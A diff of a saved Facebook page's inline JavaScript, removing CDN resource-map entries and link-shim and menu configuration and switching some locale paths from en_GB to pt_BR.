               src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yZ\/r\/x4Eyp9nQ1uk.js?_nc_x=Ij3Wp8lg5Kz",
             },
-            BDpTGZx: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iYXl4\/yK\/l\/en_GB\/ordclcpLBon.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "Zr3joV+": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iPIv4\/ya\/l\/en_GB\/UcP_RFeMtnd.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            qIKb5tG: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/PkGOE4r3wcp.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "56VCh9H": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFJJ4\/y7\/l\/en_GB\/2MZ45hnFKfR.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            lCiWnqM: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iNEW4\/y5\/l\/en_GB\/EN_hECBOZeR.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            fvoLBbw: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3itDX4\/yl\/l\/en_GB\/LUuhwfMmdHD.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            B6rkNZo: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i20w4\/yN\/l\/en_GB\/2kmV5RzQaVw.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            mI4DZcu: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/l\/0,cross\/PgW3OIHxbbF.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "kyDs\/hf": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/r\/HnQOIcA4C2E.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            HISU2Y8: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iHTt4\/yv\/l\/en_GB\/ftep7inh4JA.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            OHMMTib: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ihHI4\/yW\/l\/en_GB\/Y6zwICk0Wiv.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            jyPWGxW: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yP\/r\/qn02T7x2VK0.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            PIDmGPV: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yB\/r\/t3Z8Oik78sr.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "YRCZ+m1": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yv\/r\/s_x5AY533bT.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            VtZ600j: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/l\/0,cross\/jcBDsGzLrJN.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "0nrQV8U": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ifpJ4\/yL\/l\/en_GB\/mT31KzT8Cdl.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            TPVHIx9: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/r\/S57vNy7Bg69.js?_nc_x=Ij3Wp8lg5Kz",
-            },
             i1M3L7z: {
               type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iaO64\/yN\/l\/en_GB\/yUl5tbHzG83.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "oW+j\/g+": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i6LZ4\/yK\/l\/en_GB\/Ff84Ld3PlK_.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            q16mIqM: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/r\/j9-c2LubgGK.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            d9ty0O5: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/HYqEQJiWbpi.js?_nc_x=Ij3Wp8lg5Kz",
+              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iaO64\/yN\/l\/pt_BR\/yUl5tbHzG83.js?_nc_x=Ij3Wp8lg5Kz",
             },
             y8o969v: {
               type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/y0\/l\/en_GB\/Fn_yFqfLjfm.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            F8jo2Dj: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3irej4\/yP\/l\/en_GB\/fmncLSscJ5M.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            iWdauk4: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y_\/r\/iO9gEAPCw4m.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            mgMxG66: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTQy4\/yy\/l\/en_GB\/JuTEMyDLunG.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            zVEN6sn: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yC\/r\/FmcD4lm55ny.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            jM4vQSb: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i9Zn4\/ya\/l\/en_GB\/rw7cqZ80HnK.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "+jRpToS": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/XDDAHSZfaR6.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "0BPrThy": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/UvKMDicj6Y_.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            Jujczgk: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iAgG4\/yc\/l\/en_GB\/hhbnH1uOcyN.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "6\/gN7tW": {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/l\/0,cross\/A8rVk2oRs2x.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            PKrKxFl: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yF\/l\/0,cross\/flzyp0f7kgK.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            pLhJh6A: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/fKctVonJ1kq.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            kWILNCV: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iWdt4\/yG\/l\/en_GB\/zshAxruF_Ju.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "+HQDBGp": {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/l\/0,cross\/qnWmAARYgjf.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "CXAPN\/1": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y1\/r\/jMdtFcG4LXC.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            CNG5DkE: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iztO4\/yt\/l\/en_GB\/HHMEOSFKRME.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "F\/p4sht": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/DPBVbTz2YCI.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            wwWSdab: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iZcV4\/yc\/l\/en_GB\/-ZN3z0eJ_EB.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "E+ty88w": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/Nr-PW96DUpT.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "UJAzhS\/": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/FubvKx--XXz.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            fmA3M6T: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/MkXZ7P8-_wS.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            xLSSZ58: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yk\/l\/0,cross\/qbXjzdf_c2T.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            C9AITxH: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/12z-HvWLcxJ.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            G2PzJgj: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/l\/0,cross\/ZcW3x6JCwtn.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            rvsXwIm: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/r\/zKBeezL0ZAR.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "faOx+SK": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4Wl4\/y6\/l\/en_GB\/Ojk-vfgZKZ2.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            jj29UZB: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/r\/w5W7kbBpKe-.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            JcJMiIF: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ievZ4\/yQ\/l\/en_GB\/De9gZyw4Dbb.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            dsV5VvK: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yQ\/l\/0,cross\/lZ2emUOGiQ-.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "9jeSk45": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iFVC4\/yD\/l\/en_GB\/SCBWxoK-dMc.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            diYp6Wz: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/l\/0,cross\/u-asER-WoyF.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "nh8Q+On": {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/l\/0,cross\/UaB96RgkFSp.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            wxTMN2o: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yb\/r\/MjSmcVgJkeI.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "\/lt63Q3": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ihp64\/y_\/l\/en_GB\/MRIdLwfyZsb.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            PPDBUJb: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y7\/l\/0,cross\/VUkWSvZETxD.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            SrpP6vx: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/r\/bll4-7p4Ipj.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "L+z7QkP": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i7sB4\/ys\/l\/en_GB\/cU5Ipg33L72.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            m0x5Fgq: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ia624\/yT\/l\/en_GB\/nuI704fIYRr.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "LP\/Y1SY": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yS\/r\/Oayj55MrqrQ.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            lIaxUyf: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/l\/0,cross\/3xy55d7B12p.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            ziJBX6X: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yL\/l\/0,cross\/K8Se15eFFXN.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            BZq0Zvy: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/l\/0,cross\/cI41WpzL3XO.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            DD828tu: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yv\/l\/0,cross\/AQjRTCl0kW3.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            PogKv1z: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/IB7Ce3Vxnr4.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            TuiPcIO: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yO\/l\/0,cross\/ewAXCgN2oRp.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            oUzDp1n: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/r\/Oj_SrPfIWax.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            VJ1spXI: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y9\/r\/IeYqTRED2Dt.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "14CUPgD": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yA\/r\/uh-d7eNv6zQ.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            s3WLiTz: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iwdk4\/yk\/l\/en_GB\/r43wcLCSNhe.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            C0n1piG: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yf\/r\/zMlPv7D8Cxl.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            oB5OdKl: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yE\/l\/0,cross\/Fn1dHFZR3e1.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            hUzOO1y: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yM\/r\/BHgvyvWneli.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            J53Jy5d: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i1A04\/y7\/l\/en_GB\/bRW20I3MLTZ.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            aF9iPHd: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/yi\/l\/en_GB\/yMzqnohiu7a.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            MShROPU: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yR\/r\/6zWfLYER1_0.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "e2\/yV+b": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i4EL4\/yw\/l\/en_GB\/L_3j9EDd07M.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            NaRov2Z: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i7xv4\/yH\/l\/en_GB\/iecet726DmQ.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            dLOHVPE: {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yb\/l\/0,cross\/M-L1ZzURyXQ.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            MtBBfeh: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ikyL4\/y1\/l\/en_GB\/Y7dp-9ngoD8.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            RncKcEA: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/yF\/l\/en_GB\/7OtqmB6ahzY.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            owsyghQ: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iSzN4\/yE\/l\/en_GB\/CoQZlOAS9ZO.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            FIWs9pb: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/DM5FMKCrhOI.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            NCuetvN: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i0BK4\/yG\/l\/en_GB\/loXKJj1n0jf.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "9V\/+6wi": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iAiU4\/yA\/l\/en_GB\/UjslSpfkkKz.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            u4NoyfU: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ibcU4\/y2\/l\/en_GB\/XnT0_qVBmx0.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            XmXQW8M: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iz8e4\/yD\/l\/en_GB\/8YNHB5UpFo4.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "PTs\/6Uy": {
-              type: "css",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ya\/l\/0,cross\/QRwHK_hmJza.css?_nc_x=Ij3Wp8lg5Kz",
-            },
-            R7NyDOd: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iDSI4\/yw\/l\/en_GB\/1YoGkKpa_vu.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            tQpMpFd: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yb\/r\/WFtsgVQMYhy.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "hIek+bG": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yY\/r\/DZ_VBlsy-dC.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            qyPFONl: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yK\/r\/p8J8gsseO9k.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            rRSeTc7: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTfb4\/y7\/l\/en_GB\/Tx_W2oOIH6A.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            x22Oby4: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/fN3cCj7Il4D.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "8ELCBwH": {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/VRzSVH5iU-V.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            Njh67P7: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3izZ-4\/yv\/l\/en_GB\/IOMvEhKlxaL.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            SWx3yNv: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/O_SjdcR-xKL.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            oE4DofT: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/r\/EejAgnHUad4.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            VvVFw8n: {
-              type: "js",
-              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz",
-            },
-            "P\/mr5VE": {
-              type: "css",
-              src: "data:text\/css; charset=utf-8,\u002523bootloader_P_mr5VE{height:42px;}.bootloader_P_mr5VE{display:block!important;}",
-              nc: 1,
-              d: 1,
+              src: "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iLl54\/y0\/l\/pt_BR\/Fn_yFqfLjfm.js?_nc_x=Ij3Wp8lg5Kz",
             },
           },
           compMap: {
@@ -2825,7 +2314,7 @@
                 "nh8Q+On",
                 "CGkH4FY",
                 "y8o969v",
-                "BDpTGZx",
+                "BDpKGZx",
                 "wxTMN2o",
                 "\/lt63Q3",
                 "VdF6ypd",
@@ -3240,1198 +2729,6 @@
             },
             React: { r: ["R0lSirj", "nc2ZTn5"], be: 1 },
           },
-        });
-      });
-    </script>
-    <script>
-      requireLazy(["InitialJSLoader"], function (InitialJSLoader) {
-        InitialJSLoader.loadOnDOMContentReady([
-          "jpW6YKq",
-          "fmA3M6T",
-          "vhw5GRt",
-          "UiX2b\/\/",
-          "GKQxLch",
-          "R0lSirj",
-          "VdF6ypd",
-          "ZaK7abM",
-          "s84NfZE",
-          "Vlvz+ek",
-          "BDpTGZx",
-          "79Y8bmL",
-          "WSN8hNl",
-          "CGkH4FY",
-          "nc2ZTn5",
-          "qIKb5tG",
-          "P\/mr5VE",
-        ]);
-      });
-    </script>
-    <script>
-      requireLazy(
-        ["TimeSliceImpl", "ServerJS"],
-        function (TimeSlice, ServerJS) {
-          var s = new ServerJS();
-          s.handle({
-            define: [
-              [
-                "LinkshimHandlerConfig",
-                [],
-                {
-                  supports_meta_referrer: true,
-                  default_meta_referrer_policy: "origin-when-crossorigin",
-                  switched_meta_referrer_policy: "origin",
-                  non_linkshim_lnfb_mode: null,
-                  link_react_default_hash:
-                    "AT1CM6oKbyujS_xUrrt1AKU2Z-pwCSYb1UgvxEnmz5oMBfAESYOqlkiDefdud0G6SUrqIooaTJVhVctTwCv3aeyjyITqPvUKt4mMaNqnQHQA362ShJwZOx6OUVkh3UbYpftR_B_M7pidQI0p4zBb1A",
-                  untrusted_link_default_hash:
-                    "AT2EYxFLlpi4AKWOF0JahHkEaEUGKjfFBcIfdvksH2xtLu_KcWrbEXfZY7Q0IYv2H0o0qWhfdCwq9GZCr8lfajlYH2R91nCOzm79s9BNNsRc8-YHdgV9hJtZB-I3uE8Qbg7SBPNj19lpjcl4SQR5pA",
-                  linkshim_host: "l.facebook.com",
-                  linkshim_path: "\/l.php",
-                  linkshim_enc_param: "h",
-                  linkshim_url_param: "u",
-                  use_rel_no_opener: true,
-                  always_use_https: true,
-                  onion_always_shim: true,
-                  middle_click_requires_event: true,
-                  www_safe_js_mode: "asynclazy",
-                  m_safe_js_mode: "MLynx_asynclazy",
-                  ghl_param_link_shim: false,
-                  click_ids: [],
-                  is_linkshim_supported: true,
-                  current_domain: "facebook.com",
-                  blocklisted_domains: [
-                    "ad.doubleclick.net",
-                    "ads-encryption-url-example.com",
-                    "bs.serving-sys.com",
-                    "ad.atdmt.com",
-                    "adform.net",
-                    "ad13.adfarm1.adition.com",
-                    "ilovemyfreedoms.com",
-                    "secure.adnxs.com",
-                  ],
-                  is_mobile_device: false,
-                },
-                27,
-              ],
-            ],
-            instances: [
-              [
-                "__inst_5b4d0c00_0_0_1t",
-                ["Menu", "XUIMenuWithSquareCorner", "XUIMenuTheme"],
-                [
-                  [],
-                  {
-                    id: "u_0_0_yf",
-                    behaviors: [{ __m: "XUIMenuWithSquareCorner" }],
-                    theme: { __m: "XUIMenuTheme" },
-                  },
-                ],
-                2,
-              ],
-              [
-                "__inst_5b4d0c00_0_1_zs",
-                [
-                  "Menu",
-                  "MenuItem",
-                  "__markup_3310c079_0_0_ug",
-                  "HTML",
-                  "__markup_3310c079_0_1_M0",
-                  "__markup_3310c079_0_2_SR",
-                  "__markup_3310c079_0_3_u0",
-                  "XUIMenuWithSquareCorner",
-                  "XUIMenuTheme",
-                ],
-                [
-                  [
-                    {
-                      value: "key_shortcuts",
-                      ctor: { __m: "MenuItem" },
-                      markup: { __m: "__markup_3310c079_0_0_ug" },
-                      label: "Keyboard shortcut help...",
-                      title: "",
-                      className: null,
-                    },
-                    {
-                      href: "\/help\/accessibility",
-                      target: "_blank",
-                      value: "help_center",
-                      ctor: { __m: "MenuItem" },
-                      markup: { __m: "__markup_3310c079_0_1_M0" },
-                      label: "Accessibility Help Centre",
-                      title: "",
-                      className: null,
-                    },
-                    {
-                      href: "\/help\/contact\/accessibility",
-                      target: "_blank",
-                      value: "submit_feedback",
-                      ctor: { __m: "MenuItem" },
-                      markup: { __m: "__markup_3310c079_0_2_SR" },
-                      label: "Submit feedback",
-                      title: "",
-                      className: null,
-                    },
-                    {
-                      href: "\/accessibility",
-                      target: "_blank",
-                      value: "facebook_page",
-                      ctor: { __m: "MenuItem" },
-                      markup: { __m: "__markup_3310c079_0_3_u0" },
-                      label: "Updates from Facebook Accessibility",
-                      title: "",
-                      className: null,
-                    },
-                  ],
-                  {
-                    id: "u_0_1_jC",
-                    behaviors: [{ __m: "XUIMenuWithSquareCorner" }],
-                    theme: { __m: "XUIMenuTheme" },
-                  },
-                ],
-                2,
-              ],
-              [
-                "__inst_e5ad243d_0_0_YI",
-                [
-                  "PopoverMenu",
-                  "__inst_1de146dc_0_1_cq",
-                  "__elem_ec77afbd_0_1_ot",
-                  "__inst_5b4d0c00_0_1_zs",
-                ],
-                [
-                  { __m: "__inst_1de146dc_0_1_cq" },
-                  { __m: "__elem_ec77afbd_0_1_ot" },
-                  { __m: "__inst_5b4d0c00_0_1_zs" },
-                  [],
-                ],
-                2,
-              ],
-              [
-                "__inst_e5ad243d_0_1_eY",
-                [
-                  "PopoverMenu",
-                  "__inst_1de146dc_0_0_3l",
-                  "__elem_ec77afbd_0_0_kJ",
-                  "__inst_5b4d0c00_0_0_1t",
-                ],
-                [
-                  { __m: "__inst_1de146dc_0_0_3l" },
-                  { __m: "__elem_ec77afbd_0_0_kJ" },
-                  { __m: "__inst_5b4d0c00_0_0_1t" },
-                  [],
-                ],
-                2,
-              ],
-              [
-                "__inst_1de146dc_0_0_3l",
-                [
-                  "Popover",
-                  "__elem_1de146dc_0_0_yk",
-                  "__elem_ec77afbd_0_0_kJ",
-                  "ContextualLayerAutoFlip",
-                  "ContextualDialogArrow",
-                ],
-                [
-                  { __m: "__elem_1de146dc_0_0_yk" },
-                  { __m: "__elem_ec77afbd_0_0_kJ" },
-                  [
-                    { __m: "ContextualLayerAutoFlip" },
-                    { __m: "ContextualDialogArrow" },
-                  ],
-                  { alignh: "left", position: "below" },
-                ],
-                2,
-              ],
-              [
-                "__inst_1de146dc_0_1_cq",
-                [
-                  "Popover",
-                  "__elem_1de146dc_0_1_Wz",
-                  "__elem_ec77afbd_0_1_ot",
-                  "ContextualLayerAutoFlip",
-                  "ContextualDialogArrow",
-                ],
-                [
-                  { __m: "__elem_1de146dc_0_1_Wz" },
-                  { __m: "__elem_ec77afbd_0_1_ot" },
-                  [
-                    { __m: "ContextualLayerAutoFlip" },
-                    { __m: "ContextualDialogArrow" },
-                  ],
-                  { alignh: "right", position: "below" },
-                ],
-                2,
-              ],
-            ],
-            markup: [
-              [
-                "__markup_3310c079_0_0_ug",
-                { __html: "Keyboard shortcut help..." },
-                1,
-              ],
-              [
-                "__markup_3310c079_0_1_M0",
-                { __html: "Accessibility Help Centre" },
-                1,
-              ],
-              ["__markup_3310c079_0_2_SR", { __html: "Submit feedback" }, 1],
-              [
-                "__markup_3310c079_0_3_u0",
-                { __html: "Updates from Facebook Accessibility" },
-                1,
-              ],
-            ],
-            elements: [
-              ["__elem_a588f507_0_1_Ei", "u_0_3_eJ", 1],
-              ["__elem_3fc3da18_0_0_Ke", "u_0_4_T4", 1],
-              ["__elem_51be6cb7_0_0_\/m", "u_0_5_LJ", 1],
-              ["__elem_1de146dc_0_0_yk", "u_0_6_HH", 1],
